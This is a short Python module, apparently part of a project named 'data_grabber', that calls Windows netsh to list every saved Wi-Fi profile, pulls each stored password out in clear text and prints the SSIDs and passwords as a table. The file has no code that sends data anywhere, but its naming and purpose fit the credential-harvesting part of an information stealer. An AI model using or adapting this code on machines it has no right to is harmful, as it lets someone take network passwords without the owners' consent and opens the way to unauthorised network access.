# data_grabber/wifi_grabber.py

import subprocess

def grab_wifi_passwords():
    """
    Extracts all saved Wi-Fi profiles and their passwords on Windows.
    Returns a list of tuples: (SSID, password)
    """
    wifi_list = []
    try:
        # Get all Wi-Fi profiles
        output = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'],
            encoding='utf-8', errors='ignore'
        )
        profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
        for ssid in profiles:
            # Get the password for each profile
            try:
                profile_info = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'],
                    encoding='utf-8', errors='ignore'
                )
                password_lines = [line for line in profile_info.split('\n') if "Key Content" in line]
                if password_lines:
                    password = password_lines[0].split(":")[1].strip()
                else:
                    password = ""
                wifi_list.append((ssid, password))
            except Exception as e:
                wifi_list.append((ssid, f"Error: {e}"))
    except Exception as e:
        print(f"Error extracting Wi-Fi profiles: {e}")
    return wifi_list

if __name__ == "__main__":
    print("Wi-Fi Name                    | Password")
    print("------------------------------------------")
    for ssid, password in grab_wifi_passwords():
        print(f"{ssid:<30}| {password}")
